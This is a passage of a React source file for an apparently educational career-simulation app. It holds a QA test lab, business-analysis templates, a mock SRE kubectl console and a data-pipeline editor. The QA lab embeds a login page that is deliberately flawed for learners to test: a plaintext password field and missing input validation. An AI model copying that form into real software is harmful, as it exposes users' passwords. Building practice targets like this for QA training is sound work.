          <textarea value={notes} onChange={e=>{setNotes(e.target.value);onCodeChange(e.target.value)}}
            style={{ marginTop:10, height:100, padding:10, background:"#0A0A10", color:"#E8E3DA", fontSize:11, fontFamily:"'DM Mono',monospace", border:`1px solid ${T.border}`, borderRadius:8, resize:"none", outline:"none" }}
            placeholder="Add notes to the incident report..." />
        </div>
      )}
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// QA TEST LAB  (QA / Test Automation)
// ─────────────────────────────────────────────────────────────────────────────
const QA_BROKEN_APP = `<!DOCTYPE html><html><head><title>App Under Test</title></head>
<body style="font-family:sans-serif;padding:24px;max-width:480px">
  <h1 id="title">User Login</h1>
  <form id="loginForm">
    <input id="email" type="text" placeholder="Email" style="width:100%;padding:8px;margin-bottom:8px;box-sizing:border-box">
    <input id="password" type="text" placeholder="Password" style="width:100%;padding:8px;margin-bottom:8px;box-sizing:border-box">
    <button id="loginBtn" type="submit" style="width:100%;padding:10px;background:#3D4EAC;color:#fff;border:none;border-radius:6px;cursor:pointer">Login</button>
  </form>
  <div id="error" style="color:red;margin-top:8px"></div>
  <div id="success" style="color:green;margin-top:8px"></div>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault()
      const email = document.getElementById('email').value
      const pw = document.getElementById('password').value
      // BUG 1: No email format validation
      // BUG 2: password field uses type="text" (should be password)
      // BUG 3: empty submission should show error, but doesn't always
      if (pw.length < 4) {
        document.getElementById('error').textContent = 'Password too short'
      } else {
        document.getElementById('success').textContent = 'Logged in as ' + email
      }
    })
  </script>
</body></html>`

function QATestLab({ mission, code, onCodeChange }) {
  const [testCode, setTestCode]   = useState(code || `// QA Test Lab — write your test cases below\n// The app under test is shown in the preview pane\n\n// Example test structure:\nconst tests = [\n  {\n    name: 'Empty form shows validation error',\n    fn: async () => {\n      // TODO: click submit without filling form\n      // assert: error message is visible\n    }\n  },\n  {\n    name: 'Password field masks input',\n    fn: async () => {\n      // TODO: check password input type\n      // assert: type === "password"\n    }\n  },\n  {\n    name: 'Invalid email format rejected',\n    fn: async () => {\n      // TODO: enter "notanemail", submit\n      // assert: validation error shown\n    }\n  },\n]\n\n// Document bugs you find:\nconst BUGS_FOUND = [\n  // { id: 1, severity: 'HIGH', title: '', stepsToReproduce: '', expected: '', actual: '' }\n]\n`)
  const [bugReport, setBugReport] = useState("")
  const [tab, setTab]             = useState("tests")
  const [testResults, setResults] = useState([])
  const [runLog, setRunLog]       = useState("")

  function runSimulation() {
    // Simulate test run against the broken app
    const mockResults = [
      { name:"Empty form shows validation error", status:"FAIL", note:"No error shown when form submitted empty" },
      { name:"Password field masks input",        status:"FAIL", note:"type='text' — password visible in plaintext" },
      { name:"Invalid email format rejected",     status:"FAIL", note:"No email format validation implemented" },
      { name:"Login button is keyboard accessible", status:"PASS", note:"Button focusable, Enter key works" },
      { name:"Error message is readable",         status:"PASS", note:"Error text has adequate contrast" },
    ]
    setResults(mockResults)
    setRunLog(`Test run completed — ${mockResults.filter(r=>r.status==="PASS").length}/${mockResults.length} passed\n${mockResults.map(r=>`  ${r.status==="PASS"?"✓":"✗"} ${r.name}`).join("\n")}`)
  }

  return (
    <div style={{ flex:1, display:"flex", minHeight:0, background:T.bg2 }}>
      {/* Left: test code + controls */}
      <div style={{ flex:1, display:"flex", flexDirection:"column", borderRight:`1px solid ${T.border}` }}>
        <div style={{ display:"flex", gap:0, background:T.bg, borderBottom:`1px solid ${T.border}` }}>
          {["tests","bugs","coverage"].map(t=>(
            <button key={t} onClick={()=>setTab(t)} style={{ padding:"8px 14px", background:"none", border:"none", borderBottom:`2px solid ${tab===t?T.indigo:"transparent"}`, color:tab===t?T.indigo:T.ink3, fontSize:11, fontWeight:tab===t?800:400, cursor:"pointer", textTransform:"uppercase", letterSpacing:1 }}>
              {t}
            </button>
          ))}
          <div style={{ flex:1 }} />
          <button onClick={runSimulation} style={{ margin:"5px 10px", padding:"4px 14px", background:T.indigo, border:"none", borderRadius:6, color:"#ffffff", fontSize:11, fontWeight:700, cursor:"pointer" }}>▶ Run Tests</button>
        </div>

        {tab==="tests" && (
          <textarea value={testCode} onChange={e=>{setTestCode(e.target.value);onCodeChange(e.target.value)}}
            style={{ flex:1, padding:14, background:T.code, color:T.ink, fontSize:12, fontFamily:"'DM Mono',monospace", border:"none", resize:"none", outline:"none", lineHeight:1.7 }} />
        )}
        {tab==="bugs" && (
          <textarea value={bugReport} onChange={e=>setBugReport(e.target.value)}
            style={{ flex:1, padding:14, background:T.code, color:T.ink, fontSize:12, fontFamily:"'DM Mono',monospace", border:"none", resize:"none", outline:"none", lineHeight:1.7 }}
            placeholder={`Bug Report Template:\n\n## Bug #1\n**Title:** \n**Severity:** HIGH / MED / LOW\n**Steps to Reproduce:**\n1. \n**Expected:** \n**Actual:** \n**Screenshot/Evidence:** `} />
        )}
        {tab==="coverage" && (
          <div style={{ flex:1, overflow:"auto", padding:14, background:T.code, color:T.ink, fontFamily:"'DM Mono',monospace", fontSize:11 }}>
            {testResults.length===0
              ? <div style={{ color:"#A8A29E" }}>Run tests to see coverage results.</div>
              : <>
                  <div style={{ marginBottom:12 }}>{runLog}</div>
                  {testResults.map((r,i) => (
                    <div key={i} style={{ display:"flex", gap:8, marginBottom:6 }}>
                      <span style={{ color: r.status==="PASS"?"#22C55E":"#EF4444", fontWeight:700 }}>{r.status==="PASS"?"✓":"✗"}</span>
                      <span style={{ color:"#D6D0C8" }}>{r.name}</span>
                      {r.status==="FAIL" && <span style={{ color:"#F59E0B", fontSize:10 }}>— {r.note}</span>}
                    </div>
                  ))}
                </>
            }
          </div>
        )}
      </div>

      {/* Right: app under test */}
      <div style={{ width:"45%", display:"flex", flexDirection:"column" }}>
        <PanelHeader color={T.ink3} bg={T.bg}>APP UNDER TEST</PanelHeader>
        <iframe
          srcDoc={QA_BROKEN_APP}
          style={{ flex:1, border:"none", background:"#ffffff" }}
          sandbox="allow-scripts"
          title="App Under Test"
        />
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// BUSINESS ANALYSIS BOARD  (BA / Product Analyst)
// ─────────────────────────────────────────────────────────────────────────────
function BusinessAnalysisBoard({ mission, code, onCodeChange }) {
  const [tab, setTab]           = useState("requirements")
  const [content, setContent]   = useState(code || "")

  const TEMPLATES = {
    requirements:`# User Story\n\n**As a** [user type]\n**I want to** [action / capability]\n**So that** [benefit / value]\n\n## Acceptance Criteria\n\n- [ ] Given [context], when [action], then [expected result]\n- [ ] Edge case: [scenario]\n- [ ] Error state: [what happens when X fails]\n\n## Definition of Done\n- [ ] Design reviewed\n- [ ] Tests written\n- [ ] Stakeholder sign-off\n- [ ] Deployed to staging\n\n## Out of Scope\n- [what this story does NOT cover]\n`,
    metrics:`# Metric Definition Document\n\n## North Star Metric\n**Metric name:** \n**Formula:** \n**Data source:** \n**Reporting cadence:** Weekly\n\n## Supporting KPIs\n\n| KPI | Formula | Target | Owner |\n|-----|---------|--------|-------|\n|     |         |        |       |\n\n## Guardrail Metrics\n(metrics that must NOT degrade when optimising north star)\n- \n\n## SQL Query\n\`\`\`sql\nSELECT\n  date_trunc('week', created_at) AS week,\n  COUNT(DISTINCT user_id) AS active_users\nFROM events\nWHERE event_type = 'purchase'\nGROUP BY 1\nORDER BY 1 DESC\n\`\`\`\n`,
    process:`# Process Map\n\n## Process Name: \n**Owner:** \n**Trigger:** \n**Output:** \n\n## Current State (As-Is)\n\n\`\`\`\n[Start] → [Step 1] → [Decision?]\n                           ↓ Yes      ↓ No\n                      [Step 2]   [Step 3]\n                           ↓\n                        [End]\n\`\`\`\n\n## Pain Points\n1. \n\n## Future State (To-Be)\n\n## RACI Matrix\n\n| Activity | Responsible | Accountable | Consulted | Informed |\n|----------|-------------|-------------|-----------|----------|\n|          |             |             |           |          |\n`,
  }

  function loadTemplate(key) {
    const t = TEMPLATES[key] || ""
    setContent(t); onCodeChange(t)
  }

  return (
    <div style={{ flex:1, display:"flex", flexDirection:"column", minHeight:0, background:T.bg2 }}>
      <div style={{ display:"flex", gap:0, alignItems:"center", background:T.bg, borderBottom:`1px solid ${T.border}`, padding:"0 4px" }}>
        {["requirements","metrics","process"].map(t=>(
          <button key={t} onClick={()=>setTab(t)} style={{ padding:"9px 14px", background:"none", border:"none", borderBottom:`2px solid ${tab===t?T.indigo:"transparent"}`, color:tab===t?T.indigo:T.ink3, fontSize:11, fontWeight:tab===t?800:400, cursor:"pointer", textTransform:"uppercase", letterSpacing:1 }}>
            {t.replace("_"," ")}
          </button>
        ))}
        <div style={{ flex:1 }} />
        <button onClick={()=>loadTemplate(tab)} style={{ margin:"0 8px", padding:"4px 12px", background:T.indigo+"15", border:`1px solid ${T.indigo}30`, borderRadius:6, color:T.indigo, fontSize:10, fontWeight:700, cursor:"pointer" }}>Load Template</button>
      </div>

      <div style={{ flex:1, display:"flex", minHeight:0 }}>
        <textarea
          value={content}
          onChange={e=>{setContent(e.target.value);onCodeChange(e.target.value)}}
          placeholder={tab==="requirements" ? "Write your user story, acceptance criteria, and definition of done..." : tab==="metrics" ? "Define your KPIs, metrics, and SQL queries..." : "Map the business process, RACI, and pain points..."}
          style={{ flex:1, padding:20, background:"#FAF7F2", color:T.ink, fontSize:13, fontFamily:"'DM Sans',sans-serif", border:"none", resize:"none", outline:"none", lineHeight:1.8 }}
        />
        {/* Preview panel */}
        <div style={{ width:"40%", borderLeft:`1px solid ${T.border}`, display:"flex", flexDirection:"column" }}>
          <PanelHeader color={T.ink3} bg={T.bg}>CONTEXT</PanelHeader>
          <div style={{ flex:1, overflow:"auto", padding:14 }}>
            {tab==="requirements" && (
              <>
                <div style={{ fontSize:12, fontWeight:800, color:T.ink, marginBottom:8 }}>INVEST Criteria</div>
                {["Independent — story can be delivered alone","Negotiable — details TBD with team","Valuable — delivers user value","Estimable — team can size it","Small — fits in one sprint","Testable — acceptance criteria are clear"].map((c,i)=>(
                  <div key={i} style={{ fontSize:11, color:T.ink3, marginBottom:5, display:"flex", gap:6 }}>
                    <span style={{ color:T.green, fontWeight:700 }}>✓</span>{c}
                  </div>
                ))}
                <div style={{ marginTop:16, fontSize:12, fontWeight:800, color:T.ink, marginBottom:8 }}>Gherkin Template</div>
                <div style={{ background:"#F4F4F0", borderRadius:8, padding:10, fontSize:11, fontFamily:"'DM Mono',monospace", color:T.ink2 }}>
                  Given [initial context]<br/>When [event occurs]<br/>Then [expected outcome]
                </div>
              </>
            )}
            {tab==="metrics" && (
              <>
                <div style={{ fontSize:12, fontWeight:800, color:T.ink, marginBottom:10 }}>AARRR Framework</div>
                {[{l:"Acquisition",v:"New users, CAC"},{l:"Activation",v:"Onboarding %, Time-to-value"},{l:"Retention",v:"DAU/MAU, Churn"},{l:"Revenue",v:"ARPU, LTV, MRR"},{l:"Referral",v:"NPS, Viral coeff."}].map(({l,v},i)=>(
                  <div key={i} style={{ display:"flex", justifyContent:"space-between", padding:"6px 0", borderBottom:`1px solid ${T.border}` }}>
                    <span style={{ fontSize:11, fontWeight:700, color:T.ink }}>{l}</span>
                    <span style={{ fontSize:11, color:T.ink3 }}>{v}</span>
                  </div>
                ))}
              </>
            )}
            {tab==="process" && (
              <>
                <div style={{ fontSize:12, fontWeight:800, color:T.ink, marginBottom:10 }}>BPMN Symbols</div>
                {[{s:"◯",l:"Start/End event"},{s:"▭",l:"Task/Activity"},{s:"⬦",l:"Gateway (decision)"},{s:"→",l:"Sequence flow"},{s:"⇢",l:"Message flow"},{s:"▭▭",l:"Sub-process"}].map(({s,l},i)=>(
                  <div key={i} style={{ display:"flex", gap:10, padding:"5px 0", borderBottom:`1px solid ${T.border}` }}>
                    <span style={{ fontSize:14, width:20, textAlign:"center" }}>{s}</span>
                    <span style={{ fontSize:11, color:T.ink3 }}>{l}</span>
                  </div>
                ))}
              </>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// SRE PLATFORM CONSOLE  (SRE / Platform Engineer)
// ─────────────────────────────────────────────────────────────────────────────
const SRE_SERVICES = [
  { name:"api-gateway",    status:"degraded", cpu:89, mem:72, latency:"420ms", errors:"3.2%"  },
  { name:"auth-service",   status:"healthy",  cpu:42, mem:38, latency:"45ms",  errors:"0.1%"  },
  { name:"payment-service",status:"down",     cpu:0,  mem:0,  latency:"—",     errors:"100%"  },
  { name:"user-db",        status:"healthy",  cpu:61, mem:78, latency:"12ms",  errors:"0.0%"  },
  { name:"cache-redis",    status:"healthy",  cpu:18, mem:88, latency:"2ms",   errors:"0.0%"  },
  { name:"worker-queue",   status:"degraded", cpu:94, mem:65, latency:"1200ms",errors:"8.1%"  },
]

const KUBECTL_RESPONSES = {
  "kubectl get pods": `NAME                         READY   STATUS             RESTARTS   AGE\napigw-7d9f4b8c9-xk2p1        1/1     Running            0          2h\nauth-5c6d7e8f-mn3q2          1/1     Running            0          2h\npayment-6b7c8d9e-rs4t5       0/1     CrashLoopBackOff   14         45m\nworker-8e9f0a1b-uv6w7        1/1     Running            3          90m`,
  "kubectl describe pod payment": `Name: payment-6b7c8d9e-rs4t5\nStatus: Failed\nReason: OOMKilled\nLast State: Terminated (reason: OOMKilled)\nLimits: memory 128Mi\nRequests: memory 64Mi\nEvents:\n  Warning  OOMKilling  payment container OOMKilled: memory usage exceeded limit`,
  "kubectl logs payment --previous": `[2024-01-15 02:14:00] Starting payment service...\n[2024-01-15 02:14:01] Connecting to payment-db:5432...\n[2024-01-15 02:14:01] ERROR: Connection refused — max connections exceeded\n[2024-01-15 02:14:02] FATAL: Out of memory during DB retry loop\npanic: runtime error: invalid memory address`,
  "kubectl get events": `LAST SEEN   TYPE      REASON      OBJECT                    MESSAGE\n45m         Warning   OOMKilled   pod/payment-6b7c8d9e-rs4t5  Container payment OOMKilled\n43m         Normal    Pulled      pod/payment-6b7c8d9e-rs4t5  Pulled image\n43m         Warning   BackOff     pod/payment-6b7c8d9e-rs4t5  Back-off restarting failed container`,
  "kubectl top pods": `NAME                        CPU(cores)  MEMORY(bytes)\napigw-7d9f4b8c9-xk2p1       890m        720Mi\nworker-8e9f0a1b-uv6w7       940m        650Mi\nauth-5c6d7e8f-mn3q2         420m        380Mi\nuser-db pod                  610m        780Mi`,
}

function SREConsole({ mission, code, onCodeChange }) {
  const [input, setInput]           = useState("")
  const [termOutput, setTermOutput] = useState("$ kubectl get pods\n" + (KUBECTL_RESPONSES["kubectl get pods"] || ""))
  const [tab, setTab]               = useState("services")
  const [sloText, setSloText]       = useState(code || "")

  function runCommand(cmd) {
    const trimmed = cmd.trim()
    const key = Object.keys(KUBECTL_RESPONSES).find(k => trimmed.toLowerCase().includes(k))
    const result = key ? KUBECTL_RESPONSES[key] : `bash: ${trimmed}: command not found (hint: try 'kubectl get pods' or 'kubectl describe pod payment')`
    const newOut = termOutput + `\n$ ${trimmed}\n${result}`
    setTermOutput(newOut); onCodeChange(sloText + "\n" + newOut)
    setInput("")
  }

  const STATUS_COLORS = { healthy:"#059669", degraded:"#D97706", down:"#DC2626" }

  return (
    <div style={{ flex:1, display:"flex", flexDirection:"column", minHeight:0, background:T.bg2 }}>
      <div style={{ display:"flex", gap:0, background:T.bg, borderBottom:`1px solid ${T.border}` }}>
        {["services","terminal","slo"].map(t=>(
          <button key={t} onClick={()=>setTab(t)} style={{ padding:"9px 14px", background:"none", border:"none", borderBottom:`2px solid ${tab===t?T.indigo:"transparent"}`, color:tab===t?T.indigo:T.ink3, fontSize:11, fontWeight:tab===t?800:400, cursor:"pointer", textTransform:"uppercase", letterSpacing:1 }}>{t.toUpperCase()}</button>
        ))}
      </div>

      {tab==="services" && (
        <div style={{ flex:1, overflow:"auto", padding:16 }}>
          <div style={{ fontSize:10, color:T.ink4, marginBottom:12, letterSpacing:1 }}>SERVICE HEALTH DASHBOARD — PRODUCTION</div>
          <div style={{ display:"grid", gridTemplateColumns:"repeat(auto-fill,minmax(280px,1fr))", gap:10 }}>
            {SRE_SERVICES.map((s,i)=>(
              <div key={i} style={{ background:T.bg, border:`1px solid ${STATUS_COLORS[s.status]}40`, borderLeft:`3px solid ${STATUS_COLORS[s.status]}`, borderRadius:10, padding:"12px 14px" }}>
                <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:10 }}>
                  <span style={{ fontSize:13, fontWeight:800, color:T.ink }}>{s.name}</span>
                  <span style={{ fontSize:10, fontWeight:700, color:STATUS_COLORS[s.status], background:STATUS_COLORS[s.status]+"15", padding:"2px 8px", borderRadius:99, textTransform:"uppercase" }}>{s.status}</span>
                </div>
                <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:6 }}>
                  {[["CPU",`${s.cpu}%`,s.cpu>80?"#DC2626":"#059669"],["MEM",`${s.mem}%`,s.mem>85?"#DC2626":"#059669"],["Latency",s.latency,"#6366F1"],["Errors",s.errors,parseFloat(s.errors)>1?"#DC2626":"#059669"]].map(([l,v,c])=>(
                    <div key={l} style={{ background:T.cream, borderRadius:6, padding:"5px 8px" }}>
                      <div style={{ fontSize:9, color:T.ink4 }}>{l}</div>
                      <div style={{ fontSize:12, fontWeight:800, color:c }}>{v}</div>
                    </div>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {tab==="terminal" && (
        <div style={{ flex:1, display:"flex", flexDirection:"column", background:"#0A0A14" }}>
          <div style={{ flex:1, overflow:"auto", padding:"14px 16px", fontFamily:"'DM Mono',monospace", fontSize:11, color:"#E8E3DA", whiteSpace:"pre-wrap", lineHeight:1.6 }}>
            {termOutput}
          </div>
          <div style={{ display:"flex", gap:8, padding:"10px 14px", borderTop:"1px solid #1F2937" }}>
            <span style={{ color:"#22D3EE", fontSize:12, fontFamily:"'DM Mono',monospace", alignSelf:"center" }}>$</span>
            <input value={input} onChange={e=>setInput(e.target.value)}
              onKeyDown={e=>e.key==="Enter"&&runCommand(input)}
              placeholder="kubectl get pods"
              style={{ flex:1, background:"transparent", border:"none", color:"#E8E3DA", fontSize:12, fontFamily:"'DM Mono',monospace", outline:"none" }} />
            <button onClick={()=>runCommand(input)} style={{ padding:"4px 12px", background:"#6366F1", border:"none", borderRadius:5, color:"#ffffff", fontSize:11, cursor:"pointer" }}>Run</button>
          </div>
        </div>
      )}

      {tab==="slo" && (
        <div style={{ flex:1, display:"flex", flexDirection:"column", padding:16 }}>
          <div style={{ fontSize:10, color:T.ink4, marginBottom:8, letterSpacing:1 }}>SLO DEFINITION & POSTMORTEM</div>
          <textarea value={sloText} onChange={e=>{setSloText(e.target.value);onCodeChange(e.target.value)}}
            style={{ flex:1, padding:14, background:"#FAF7F2", color:T.ink, fontSize:12, fontFamily:"'DM Mono',monospace", border:`1px solid ${T.border}`, borderRadius:8, resize:"none", outline:"none", lineHeight:1.7 }}
            placeholder={`## SLO Definition\n\n**Service:** payment-service\n**SLI:** Availability = successful_requests / total_requests\n**SLO:** 99.9% availability over 30-day rolling window\n**Error Budget:** 43.8 minutes/month\n\n## Postmortem\n\n**Incident:** payment-service CrashLoopBackOff\n**Duration:** 45 min  \n**Impact:** 100% of payment requests failed\n**Root Cause:** OOMKilled — memory limit 128Mi too low for DB retry loop\n\n## Action Items\n- [ ] Increase memory limit to 512Mi\n- [ ] Add circuit breaker for DB retries\n- [ ] Set up OOM alert at 80% memory`} />
        </div>
      )}
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// DATA PIPELINE STUDIO  (Data Engineer)
// ─────────────────────────────────────────────────────────────────────────────
function DataPipelineStudio({ mission, code, onCodeChange }) {
  const [pipelineCode, setPipelineCode] = useState(code || `# Data Pipeline — ${mission?.title || 'ETL Task'}
# REAL execution: /data/raw.csv exists in the runtime — your pipeline actually runs.
import pandas as pd

# ─── EXTRACT ──────────────────────────────────────────────────────────────────
def extract(source_path: str) -> pd.DataFrame:
    """Extract raw data from source"""
    df = pd.read_csv(source_path)
    print(f"Extracted {len(df)} rows from {source_path}")
    return df

# ─── TRANSFORM ────────────────────────────────────────────────────────────────
def transform(df: pd.DataFrame) -> pd.DataFrame:
    """Clean and transform the data"""
    # TODO: drop NULL amounts, dedupe order_id, normalise city casing
    return df

# ─── LOAD ─────────────────────────────────────────────────────────────────────
def load(df: pd.DataFrame, target: str) -> None:
    """Load transformed data to destination"""
    df.to_csv(target, index=False)
    print(f"Loaded {len(df)} rows to {target}")

# ─── PIPELINE ─────────────────────────────────────────────────────────────────
def run_pipeline():
    raw = extract('/data/raw.csv')
    clean = transform(raw)
    load(clean, '/data/processed.csv')
    print("Pipeline complete")

run_pipeline()
`)
  const [tab, setTab] = useState("code")
  const [runOut, setRunOut]     = useState(null)
  const [runStatus, setRunStatus] = useState(null)
  const [runningPipe, setRunningPipe] = useState(false)

  const runPipeline = async () => {
    if (runningPipe) return
    setRunningPipe(true); setRunOut(null)
    try {
      const out = await runPython(mission, pipelineCode, setRunStatus)
      setRunOut(out)
    } catch (e) { setRunOut({ stdout: "", error: `Runtime failed to load: ${e.message}`, images: [] }) }
    setRunStatus(null); setRunningPipe(false)
  }

  const pipeHealthy = runOut && !runOut.error

  // ── shell action bus: ▶ Run Pipeline + proof draft ──
  const busRef = useRef({})
  busRef.current = { runPipeline, pipelineCode, runOut }
  useEffect(() => {
    const unRun = registerRunner(() => busRef.current.runPipeline())
    const unProof = registerProofProvider(() => {
      const { pipelineCode: pc, runOut: ro } = busRef.current
      const artifacts = []
      if (pc?.trim()) artifacts.push({ type: "code", label: "Pipeline code", content: pc })
      if (ro?.stdout) artifacts.push({ type: "report", label: "Pipeline run output", content: ro.stdout.slice(0, 2000) })
      if (ro?.error) artifacts.push({ type: "report", label: "Pipeline failure (last run)", content: ro.error.slice(0, 1200) })
      return { headline: mission?.title || "Data pipeline", artifacts }
    })
    return () => { unRun(); unProof() }
  }, []) // eslint-disable-line

  const DAG_NODES = [
    { id:"source",    x:40,  y:80,  label:"Source",     color:"#3B82F6", icon:"📥" },
    { id:"validate",  x:180, y:80,  label:"Validate",   color:"#D97706", icon:"✓" },
    { id:"transform", x:320, y:80,  label:"Transform",  color:"#7C3AED", icon:"⚙️" },
    { id:"load",      x:460, y:80,  label:"Load",       color:"#059669", icon:"📤" },
    { id:"notify",    x:600, y:80,  label:"Notify",     color:"#A8A29E", icon:"🔔" },
  ]

  return (
    <div style={{ flex:1, display:"flex", flexDirection:"column", minHeight:0, background:T.bg2 }}>
      <div style={{ display:"flex", gap:0, background:T.bg, borderBottom:`1px solid ${T.border}`, alignItems:"center" }}>
        {["code","dag","schema"].map(t=>(
          <button key={t} onClick={()=>setTab(t)} style={{ padding:"9px 14px", background:"none", border:"none", borderBottom:`2px solid ${tab===t?T.indigo:"transparent"}`, color:tab===t?T.indigo:T.ink3, fontSize:11, fontWeight:tab===t?800:400, cursor:"pointer", textTransform:"uppercase", letterSpacing:1 }}>{t.toUpperCase()}</button>
        ))}
        <button onClick={runPipeline} disabled={runningPipe} style={{ marginLeft:"auto", marginRight:10, padding:"4px 14px", borderRadius:6, border:"none", background: runningPipe ? "#A8A29E" : "#059669", color:"#ffffff", fontSize:11, fontWeight:700, cursor: runningPipe ? "wait" : "pointer" }}>
          {runningPipe ? (runStatus || "⟳ Running…") : "▶ Run Pipeline"}
        </button>
      </div>

      {tab==="code" && (
        <div style={{ flex:1, display:"flex", flexDirection:"column", minHeight:0 }}>
          <textarea value={pipelineCode} onChange={e=>{setPipelineCode(e.target.value);onCodeChange(e.target.value)}}
            style={{ flex:1, padding:16, background:T.code, color:T.ink, fontSize:12, fontFamily:"'DM Mono',monospace", border:"none", resize:"none", outline:"none", lineHeight:1.7 }} />
          {/* Real run console */}
          <div style={{ flex:"0 0 32%", borderTop:"1px solid #2D2D44", background:"#11111E", overflow:"auto" }}>
            <div style={{ padding:"5px 14px", fontSize:9, fontWeight:800, letterSpacing:1, textTransform:"uppercase", color: runOut?.error ? "#F87171" : "rgba(255,255,255,0.35)", borderBottom:"1px solid #2D2D44", position:"sticky", top:0, background:"#11111E" }}>
              {runningPipe ? (runStatus || "⟳ Running pipeline…") : runOut ? (runOut.error ? "✗ Pipeline failed" : "✓ Pipeline output") : "Console — ▶ Run Pipeline executes your code for real (first run downloads Python, ~15 MB)"}
            </div>
            {runOut && (
              <div style={{ padding:"8px 14px" }}>
                {runOut.stdout && <pre style={{ margin:0, fontFamily:"'DM Mono',monospace", fontSize:11, color:"#A7F3D0", whiteSpace:"pre-wrap", lineHeight:1.55 }}>{runOut.stdout}</pre>}
                {runOut.error && <pre style={{ margin:"6px 0 0", fontFamily:"'DM Mono',monospace", fontSize:11, color:"#F87171", whiteSpace:"pre-wrap", lineHeight:1.55 }}>{runOut.error}</pre>}
              </div>
            )}
          </div>
        </div>
      )}

      {tab==="dag" && (
        <div style={{ flex:1, overflow:"auto", padding:24 }}>
          <div style={{ fontSize:10, color:T.ink4, marginBottom:16, letterSpacing:1 }}>PIPELINE DAG VISUALISER</div>
          <div style={{ position:"relative", height:180, background:T.bg2, borderRadius:12, border:`1px solid ${T.border}` }}>
            <svg style={{ position:"absolute", inset:0, width:"100%", height:"100%", pointerEvents:"none" }}>
              {DAG_NODES.slice(0,-1).map((n,i) => {
                const next = DAG_NODES[i+1]
                return <line key={i} x1={n.x+54} y1={n.y+24} x2={next.x} y2={next.y+24} stroke="#D6D0C8" strokeWidth="2" markerEnd="url(#arrow)" />
              })}
              <defs><marker id="arrow" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#D6D0C8"/></marker></defs>
            </svg>
            {DAG_NODES.map(n=>(
              <div key={n.id} style={{ position:"absolute", left:n.x, top:n.y, width:108, padding:"10px 8px", background:T.bg, border:`2px solid ${n.color}40`, borderRadius:10, textAlign:"center", boxShadow:`0 2px 8px ${n.color}20` }}>
                <div style={{ fontSize:18, marginBottom:3 }}>{n.icon}</div>
                <div style={{ fontSize:11, fontWeight:800, color:n.color }}>{n.label}</div>
                <div style={{ fontSize:9, color: runOut ? (pipeHealthy ? "#059669" : "#DC2626") : "#A8A29E", fontWeight:600 }}>
                  {runOut ? (pipeHealthy ? "✓ passed" : "✗ failed") : "○ not run"}
                </div>
              </div>
            ))}
          </div>
          <div style={{ marginTop:16, fontSize:11, color:T.ink3 }}>
            Node status reflects your last real pipeline run. Use ▶ Run Pipeline in the toolbar.
          </div>
        </div>
      )}

      {tab==="schema" && (
        <div style={{ flex:1, overflow:"auto", padding:16 }}>
          <div style={{ fontSize:10, color:T.ink4, marginBottom:12, letterSpacing:1 }}>SOURCE SCHEMA — /data/raw.csv (real file in the runtime)</div>
          <div style={{ background:T.bg, borderRadius:10, border:`1px solid ${T.border}`, overflow:"hidden" }}>
            <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", background:T.indigo, padding:"8px 12px" }}>
              {["Column","Type","Nullable","Notes"].map(h=><div key={h} style={{ fontSize:11, fontWeight:700, color:"#ffffff" }}>{h}</div>)}
            </div>
            {[["order_id","TEXT","No","Has duplicates — dedupe!"],["customer_id","INTEGER","No","FK to customers"],["product_id","INTEGER","No","FK to products"],["order_date","TEXT","No","YYYY-MM-DD"],["quantity","INTEGER","No",""],["amount","REAL","Yes","Contains NULLs — handle them"],["category","TEXT","No",""],["status","TEXT","No","Delivered / Cancelled / Returned"],["city","TEXT","No","Inconsistent casing"]].map((r,i)=>(
              <div key={i} style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", padding:"7px 12px", background:i%2===0?T.bg:T.bg2 }}>
                {r.map((c,j)=><div key={j} style={{ fontSize:11, fontFamily:j<2?"'DM Mono',monospace":"inherit", color:j===0?T.indigo:T.ink3 }}>{c}</div>)}
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// SYSTEM DESIGN WORKSTATION — production-quality 3-pane layout
// Left: prompt tabs  |  Center: architecture canvas  |  Right: spec notes
// ─────────────────────────────────────────────────────────────────────────────
const SD_LAYERS = [
  {
    id: "client", label: "Client", color: "#6B6560", bg: "#F8F7F5", border: "#D6D0C8",
    items: [
      { id:"client",  label:"Client",     shortLabel:"Client",  icon:"💻" },
      { id:"mobile",  label:"Mobile App", shortLabel:"Mobile",  icon:"📱" },
      { id:"browser", label:"Browser",    shortLabel:"Browser", icon:"🌐" },
    ],
  },
  {
    id: "edge", label: "Edge / Gateway", color: "#0369A1", bg: "#F0F9FF", border: "#BAE6FD",
    items: [
      { id:"cdn",     label:"CDN",         shortLabel:"CDN",     icon:"🌍" },
      { id:"lb",      label:"Load Balancer",shortLabel:"LB",     icon:"⚖️" },
      { id:"gateway", label:"API Gateway", shortLabel:"Gateway", icon:"🚪" },
    ],
  },
  {
    id: "app", label: "Application", color: "#059669", bg: "#F0FDF4", border: "#BBF7D0",
    items: [
      { id:"api",       label:"API Server",  shortLabel:"API",     icon:"🔧" },
      { id:"auth",      label:"Auth Service",shortLabel:"Auth",    icon:"🔐" },
      { id:"worker",    label:"Worker",      shortLabel:"Worker",  icon:"⚙️" },
      { id:"ml",        label:"ML Service",  shortLabel:"ML",      icon:"🧠" },
      { id:"analytics", label:"Analytics",   shortLabel:"Analytics",icon:"📊" },
      { id:"notif",     label:"Notifications",shortLabel:"Notif",  icon:"🔔" },
    ],
  },
  {
    id: "data", label: "Data / Storage", color: "#7C3AED", bg: "#F5F3FF", border: "#DDD6FE",
    items: [
      { id:"postgres", label:"PostgreSQL", shortLabel:"PostgreSQL", icon:"🐘" },
      { id:"mysql",    label:"MySQL",      shortLabel:"MySQL",      icon:"🗄️" },
      { id:"mongo",    label:"MongoDB",    shortLabel:"MongoDB",    icon:"🍃" },
      { id:"redis",    label:"Redis Cache",shortLabel:"Redis",      icon:"⚡" },
